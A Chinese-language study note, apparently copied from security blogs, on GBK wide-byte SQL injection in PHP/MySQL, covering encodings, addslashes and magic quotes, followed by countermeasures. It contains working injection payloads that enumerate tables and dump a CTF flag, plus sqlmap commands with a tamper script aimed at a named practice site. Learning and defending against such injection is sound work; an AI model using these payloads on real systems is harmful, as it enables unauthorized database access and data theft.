
# Day7

## 2019/07/15

### 宽字节+sqlmap

----

#### 原理

Mysql 在使用GBK编码时，会认为两个字符为一个汉字。宽字节注入就是发生在PHP向Mysql请求时字符集使用了GBK编码

具体的可以参考一下

```
https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html
https://blog.csdn.net/caiqiiqi/article/details/68952300
```

归根结底可以说是个历史遗留问题

#### 简述一下几个编码

URL编码：一个字符ascii码的十六进制，再在前面加上%,如""的ASCII码为是92，92的十六进制是5c，所以“”的url编码就是%5c。

GBK编码：在GB2312-80标准基础上的内码扩展规范，使用了双字节编码方案，其编码范围从8140至FEFE（剔除xx7F）

UTF-8:由于ASCII表示的字符只有128个，因此网络世界的规范是使用UNICODE编码，但是用ASCII表示的字符使用UNICODE并不高效。因此出现了中间格式字符集，被称为通用转换格式，及UTF（Universal Transformation Format）。一个utf-8编码的汉字占三个字节

#### 涉及到的一些内容/函数

PHP在开启magic_quotes_gpc或者使用addslashes、iconv等函数的时候，单引号（’）会被转义成\’。比如字符%bf在满足上述条件的情况下会变成%bf\’。其中反斜杠（\）的十六进制编码是%5C，单引号（’）的十六进制编码是%27，那么就可以得出%bf \’=%bf%5c%27。

如果程序的默认字符集是GBK等宽字节字符集，则MySQL会认为%bf%5c是一个宽字符，也就是“縗”。也就是说%bf \’=%bf%5c%27=縗’。说到这里好像还没有看出来到底有什么用。了解PHP+MySQL注入的朋友应该都明白，单引号在注入里绝对是个好东西。尤其是，很多程序员都过分依赖于 magic_quotes_gpc或者addslashes、iconv等函数的转义。理论上说，只要数据库连接代码设置了GBK编码，或者是默认编码就 是GBK，那现在的程序里到处都是注入漏洞。

----

> addslashes()

这个函数返回在预定义字符之前添加反斜杠 \ 。预定义字符： 单引号 ‘ 、双引号 “ 、反斜杠 \ 、NULL。但是这个函数有一个特点就是虽然会添加反斜杠 \ 进行转义，但是 \ 并不会插入到数据库中。这个函数的功能和魔术引号完全相同，所以当打开了魔术引号时，不能使用这个函数。可以使用get_magic_quotes_gpc()来检测是否已经转义。

> mysql_real_escape_string()

这个函数用来转义sql语句中的特殊符号x00 、\n 、\r 、\ 、‘ 、“ 、x1a。


> 魔术引号

当打开时，所有的单引号’、双引号”、反斜杠\和NULL字符都会被自动加上一个反斜线来进行转义，这个和 addslashes()函数的作用完全相同。所以，如果魔术引号打开了，就不要使用addslashes()函数了。一共有三个魔术引号指令。

1.magic_quotes_gpc 影响到 HTTP 请求数据（GET，POST 和 COOKIE）。不能在运行时改变。在 PHP 中默认值为 on。 在magic_quotes_gpc=on的情況下，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()；

2.magic_quotes_runtime 如果打开的话，大部分从外部来源取得数据并返回的函数，包括从数据库和文本文件，所返回的数据都会被反斜线转义。该选项可在运行的时改变，在 PHP 中的默认值为 off。 参见 set_magic_quotes_runtime() 和 get_magic_quotes_runtime()。

3.magic_quotes_sybase 如果打开的话，将会使用单引号对单引号进行转义而非反斜线。此选项会完全覆盖 magic_quotes_gpc。如果同时打开两个选项的话，单引号将会被转义成 ‘’。而双引号、反斜线 和 NULL 字符将不会进行转义。 如何取得其值参见 ini_get()。
输入%df’会报错

----

由此可以构造如下语句：

`%df’ union select 1,2 %23`

`%df’ union select 1,database() %23`

`%df%27%20union%20select%201,table_name%20from%20information_schema.tables
%20where%20table_schema=database()%23`

`%df%27%20union%20select%201,group_concat(table_name)%20from%20
information_schema.tables%20where%20table_name=database()%23`

`%df%27%20union%20select%201,group_concat(column_name)%20from%20
information_schema.columns%20where%20table_name=0x63746634%23`

`id=%df%27%20union%20select%201,flag%20from%20ctf4%23`


接下来使用sqlmap，可以拿南邮给的地址跑：

`python sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3 –tamper unmagicquotes –dbs `

`python sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3 –tamper unmagicquotes -D sae-chinalover –table `

`python sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3 –tamper unmagicquotes -D sae-chinalover -T ctf4 –columns –dump `

#### 对策

使用mysql_real_escape_string() （ps：在执行sql注入之前必须使用mysql_set_charset指定php连接mysql的字符集,单独调用mysql_real_escape_string是无法防御的）

or 将character_set_client设置为binary

```php
$mysqli->query("SET NAMES 'gbk'");
$mysqli->query("SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary");
$id = isset($_GET['id'])?addslashes($_GET['id']):1;
$sql = "select * from users where id = '{$id}'";

$result = $mysqli->query($sql)or die($mysqli->error);

while ($row = mysqli_fetch_assoc($result)){

    echo "<h2 style='color:red'>执行的sql语句为:<b>$sql</b></h2><p>结果id:<b>{$row['id']}</b>---user:<b>{$row['name']}</b></p>";
}
```


----
copied from：

```c
https://www.evi1s.com/archives/100/
https://711lab.club/2018/12/09/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5-sqlmap/
```